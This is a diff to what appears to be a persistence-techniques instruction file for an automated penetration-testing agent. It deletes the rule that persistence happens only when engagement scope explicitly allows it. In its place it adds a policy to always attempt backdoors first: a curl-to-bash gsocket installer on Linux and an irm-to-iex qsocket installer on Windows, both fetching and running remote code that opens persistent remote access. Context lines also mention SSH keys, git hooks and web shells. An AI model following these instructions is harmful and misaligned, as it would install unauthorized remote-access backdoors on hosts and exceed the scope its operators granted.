@@ -7,9 +7,27 @@ description: Persistence techniques (Linux/Windows/AD — services, WMI, hijacki
 
 ## Persistence
 
-⚠️ **Only if engagement scope explicitly allows persistence.** If unsure, skip persistence and document instead.
+⚠️ **Persistence is restricted to high-value targets (e.g., Domain Controllers, core servers) . Prior to establishing persistence, always inspect the target to verify that an identical persistence mechanism is not already deployed; skip if already present is ambiguous.**
 
-### Linux Persistence
+**Priority Policy**:
+1. **Linux Default & Highest Priority**: Always attempt `### Liunx Gsocket Persistent` first.
+2. **Windows Default & Highest Priority**: Always attempt `### Windows Qsocket Persistence` first.
+2. **Idempotency**: Always inspect the host before executing to ensure the same persistence mechanism is not already deployed.
+
+### Liunx Gsocket Persistent (Priority 1 - Default)
+
+```bash
+# Linux Deploy (simplest, most common)
+# The secret obtained via gsocket must be documented in the report.
+
+bash -c "$(curl -fsSL https://gsocket.io/y)"
+
+## official reference
+- [gs-netcat Commands](https://www.thc.org/gs-netcat.1.html)
+- [Global Socket Project](https://github.com/hackerschoice/gsocket)
+```
+
+### Linux Basic Persistence
 
 ```bash
 # SSH authorized_keys (simplest, most common)
@@ -65,6 +83,19 @@ chmod +x .git/hooks/post-merge
 
 # Web shell on an existing web root (when write access exists)
 # Keep one file, name it to blend, record it for removal
+```
+
+### Windows Qsocket Persistence
+
+```powershell
+# Windows Deploy (simplest, most common)
+# The secret obtained via qsocket must be documented in the report.
+
+powershell -c irm qsocket.io/1 | iex
+
+## official reference
+- [qs-netcat Commands](https://www.qsocket.io/examples/#usage-examples)
+- [Qsocket Github Page](https://github.com/qsocket/qs-netcat)
 ```
 
 ### Windows Persistence
